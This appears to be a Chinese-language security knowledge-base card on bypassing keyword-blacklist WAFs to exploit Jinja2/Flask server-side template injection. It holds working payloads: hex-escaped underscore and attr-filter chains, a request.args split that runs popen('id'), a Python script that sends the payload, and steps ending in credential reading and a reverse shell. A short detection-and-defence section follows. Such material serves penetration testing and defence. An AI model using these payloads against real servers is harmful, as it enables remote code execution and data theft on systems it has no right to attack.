---
id: web-python-ssti-jinja2-waf-bypass-hex-attr-args
title: Jinja2 SSTI WAF 绕过：\x5f 十六进制下划线、attr 过滤器与 request.args 参数拆分
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-ssti-waf-bypass-encoding-and-param-splitting
aliases:
- Jinja2 WAF 绕过
- SSTI 十六进制下划线绕过
- \x5f 绕过 __class__
- attr 过滤器绕过 SSTI
- request.args 拆分 payload
- Flask SSTI 绕过黑名单
tags:
- python
- flask
- jinja2
- ssti
- waf-bypass
- encoding
- attr-filter
- parameter-splitting
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V30
  verified_at: '2026-11-05T03:19:11+08:00'
  notes: 已对照原文核对hex下划线/attr/request.args三种绕过与PoC；原文对CVE-2025-14832/Jinja2 3.2.0的说法未独立核实，卡片未采用该CVE；PoC未在本会话执行
---

## 一句话结论

Jinja2 SSTI 的常规双下划线/`popen` 关键字被 WAF 黑名单拦截时，可利用“WAF 检查原始请求字符串、模板引擎在渲染阶段才解码”的差异绕过：把 `_` 写成 `\x5f`、用 `|attr()` 替代点号/中括号、把 `os`/`id` 等参数值拆到独立 GET 参数用 `request.args` 取值，从而在不出现黑名单字面量的情况下完成 RCE。

## 原理

- WAF 通常在反向代理/HTTP 层对原始 URL、body 做字符串匹配，匹配对象是**未解码/未渲染**的请求文本；Jinja2 在模板渲染阶段才解析字符串字面量转义与过滤器。两者对同一 payload 的“理解”不一致，就是绕过空间。
- 技术一：十六进制下划线。`_` 的 ASCII 码是 0x5f，Jinja2/Python 字符串字面量中的 `\x5f` 会在渲染时还原为 `_`：
  ```text
  {{""|attr("\x5f\x5fclass\x5f\x5f")}}
  ```
  WAF 看到的是 `\x5f\x5fclass\x5f\x5f`，不匹配 `__class__` 规则；模板渲染后得到 `__class__`。
- 技术二：`attr` 过滤器替代点号。点号访问可被 `|attr("属性名")` 替代；配合 `\x5f` 可同时绕过点号规则与属性名关键词：
  ```text
  {{lipsum|attr("\x5f\x5fglobals\x5f\x5f")}}
  ```
  `attr` 内部走 `getattr`，对下划线开头的特殊属性比点号解析更宽容；注意管道后不能直接跟 `[索引]`（会触发 TemplateSyntaxError），需用 `|last` 或 `{% set %}` 先赋值。
- 技术三：`request.args` 参数拆分。把敏感值放到独立 GET 参数，模板 body 里只写参数名，黑名单词不出现在 payload 主体：
  ```text
  /level2?name={{lipsum.__globals__[request.args.a].popen(request.args.b).read()}}&a=os&b=id
  ```
  模板中 `request.args.a`、`request.args.b` 在渲染时取到 `os`、`id`；WAF 若只检查 `name` 参数或未关联扫描所有参数，则放行。
- 技术四：字符串拼接/`chr()` 构造关键字。把 `os`、`popen` 等拆成 `"o"+"s"`、`"pop"+"en"`，或用 `chr(111)+chr(115)` 构造，绕过完整字符串黑名单。
- 前提是目标确实存在 SSTI（用户输入进入模板源码），绕过只解决“payload 被 WAF 拦截”，不解决注入点本身。

## 触发条件

- 目标存在 Jinja2/Flask SSTI（如 `render_template_string` 拼接用户输入）。
- 前置 WAF/过滤器按关键字黑名单拦截 `__class__`、`__globals__`、`__subclasses__`、`popen`、`os.`、`subprocess`、`eval`、`exec` 等特征。
- WAF 未对 `\x5f`、`\xHH` 等转义做解码后二次匹配，也未关联检查所有 GET/POST 参数。
- 目标 Jinja2 版本/环境仍允许访问函数对象的 `__globals__`（未启用严格沙箱）。

## 利用步骤

1. 用 `{{7*7}}` 确认表达式求值；确认标准 payload 被 WAF 拦截（如 403 提示 `__class__ detected`）。
2. 用 `\x5f` 编码双下划线测试基础属性访问：`{{""|attr("\x5f\x5fclass\x5f\x5f")}}`，确认返回 `<class 'str'>`。
3. 用 `|attr("\x5f\x5fglobals\x5f\x5f")` 访问 `lipsum`/`url_for` 的 globals，确认返回字典。
4. 若 `popen`/`os.` 仍被拦，改用 `request.args` 拆分：模板只引用 `request.args.a`/`b`，敏感值放入 `a=os&b=id`。
5. 逐步构造完整链并回显命令结果；必要时用 `chr()`/字符串拼接进一步拆散关键字。
6. 成功后按常规 SSTI 后利用：读 config、文件、凭据，反弹 shell。

## PoC

基础绕过（hex 下划线 + attr）：

```http
GET /level2?name=%7B%7B%22%22%7Cattr(%22%5Cx5f%5Cx5fclass%5Cx5f%5Cx5f%22)%7D%7D HTTP/1.1
Host: target:5020
```

等价明文：

```text
{{""|attr("\x5f\x5fclass\x5f\x5f")}}
```

访问 globals：

```text
{{lipsum|attr("\x5f\x5fglobals\x5f\x5f")}}
```

`request.args` 拆分（body 中不出现 `os`/`popen` 字面量）：

```http
GET /level2?name={{lipsum.__globals__[request.args.a].popen(request.args.b).read()}}&a=os&b=id HTTP/1.1
Host: target:5020
```

子类链（注意用 `|last` 代替 `[1]`）：

```text
{{""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")|last|attr("\x5f\x5fsubclasses\x5f\x5f")()|length}}
```

Python 发送（避免 Windows shell 引号丢失）：

```python
import urllib.request, urllib.parse
payload = '{{lipsum.__globals__["os"].popen("id").read()}}'
print(urllib.request.urlopen('http://target:5020/level1?name=' + urllib.parse.quote(payload)).read().decode())
```

## 变体与关联

- 变体（编码）：`\x5f` 十六进制、`\137` 八进制、`_` Unicode 转义；不同引擎的解码阶段不同，需按目标验证。
- 变体（语法）：`|attr()` 替代点号；`|last` 替代 `[1]`；`{% set %}` 分段赋值；`{% print(...) %}` 输出。
- 变体（参数源）：`request.args`、`request.values`、`request.form`、`request.cookies` 等把敏感值从 payload 主体移走。
- 变体（字符串构造）：`"o"+"s"`、`"pop"+"en"`、`chr(111)+chr(115)`、`dict(o=111,s=115)` 等。
- 关联：[[web-python-ssti-jinja2-flask-globals-rce]]（绕过 WAF 后的主利用链）。
- 关联：[[web-python-ssti-jinja2-subclasses-index-rce]]（globals 链不可用时的子类枚举回退）。
- 关联：[[web-python-ssti-bottle-unicode-octal-walrus-bypass]]（其他 Python 模板引擎的同类 WAF 绕过思路）。
- 边界：WAF 若先做 URL/转义解码再做关键词匹配，hex 绕过失效；若扫描所有参数并做关联分析，`request.args` 拆分失效；启用严格沙箱且禁用 `__globals__`/`__class__` 时链本身不成立。

## 检测与防御

- 根治：禁止 `render_template_string` 渲染用户输入；使用 `render_template` + 变量插值并保持 autoescape；动态模板使用 `SandboxedEnvironment`。
- WAF 加固：匹配前先做 URL 解码、`\xHH`/`\uHHHH`/八进制转义归一化；同时检查所有参数及其组合，而非只查单个参数；对 `{{`、`{%`、`attr(`、`request.args` 等组合特征告警。
- 但 WAF 只是辅助：编码/语法/参数拆分组合可绕过多数关键词黑名单，根本修复在代码层。
- 检测：请求中出现 `\x5f`、`\137`、`_`、`|attr(`、`request.args` 与 `__globals__`/`popen` 的组合；响应中出现类/函数 repr、异常模板错误、命令输出。
- 检测：同一来源对同一参数的高频变体尝试（不同编码/分隔方式）；WAF 403 与随后 200 的对比。
- 代码审计：搜索 `render_template_string`、`Template(...).render`、`Environment.from_string` 等入口，确认参数是否来自请求。
